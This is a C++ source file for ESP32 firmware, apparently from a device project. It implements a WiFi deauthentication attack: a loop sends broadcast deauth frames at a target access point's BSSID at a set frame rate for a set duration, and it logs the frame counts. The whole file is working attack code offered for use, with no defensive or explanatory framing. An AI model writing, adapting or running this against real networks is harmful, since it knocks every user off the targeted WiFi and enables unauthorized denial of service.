#include "deauth_attack.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_frame_injector.h"

namespace xiaozhi {

static const char* TAG = "DeauthAttack";

DeauthAttack::DeauthAttack(WifiFrameInjector* injector)
    : frame_injector_(injector) {
}

esp_err_t DeauthAttack::Execute(const DeauthAttackConfig& config,
                                const std::atomic<bool>* abort_flag,
                                AttackStatistics& stats) {
  ESP_LOGI(TAG, "Starting deauth attack");
  ESP_LOGI(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
           config.target_bssid[0], config.target_bssid[1], config.target_bssid[2],
           config.target_bssid[3], config.target_bssid[4], config.target_bssid[5]);
  ESP_LOGI(TAG, "Duration: %d seconds, Frame rate: %d fps",
           config.duration_seconds, config.frame_rate);

  // Initialize statistics
  stats.frames_sent = 0;
  stats.errors = 0;
  int64_t start_time_us = esp_timer_get_time();

  // Configure rate limiter
  RateLimiter& limiter = frame_injector_->GetRateLimiter();

  // Attack loop
  while (true) {
    // Check abort flag
    if (abort_flag && abort_flag->load()) {
      ESP_LOGI(TAG, "Deauth attack aborted by user");
      break;
    }

    // Check timeout
    int64_t now_us = esp_timer_get_time();
    int64_t elapsed_us = now_us - start_time_us;
    stats.elapsed_seconds = elapsed_us / 1000000;

    if (stats.elapsed_seconds >= config.duration_seconds) {
      ESP_LOGI(TAG, "Deauth attack completed (timeout)");
      break;
    }

    // Inject deauth frame (broadcast to all clients)
    esp_err_t ret = frame_injector_->InjectDeauthFrame(
        config.target_bssid,
        kBroadcastMac,
        DeauthReason::kClass3FrameFromNonassocSta);

    if (ret == ESP_OK) {
      stats.frames_sent++;
    } else {
      stats.errors++;
    }

    // Rate limiting
    limiter.WaitIfNeeded(1);

    // Log progress every 5 seconds
    if (stats.elapsed_seconds % 5 == 0 && stats.elapsed_seconds > 0) {
      static uint32_t last_log_second = 0;
      if (stats.elapsed_seconds != last_log_second) {
        ESP_LOGI(TAG, "Progress: %lu frames sent, %lu errors",
                 stats.frames_sent, stats.errors);
        last_log_second = stats.elapsed_seconds;
      }
    }
  }

  ESP_LOGI(TAG, "Deauth attack finished: %lu frames sent, %lu errors",
           stats.frames_sent, stats.errors);

  return ESP_OK;
}

}  // namespace xiaozhi
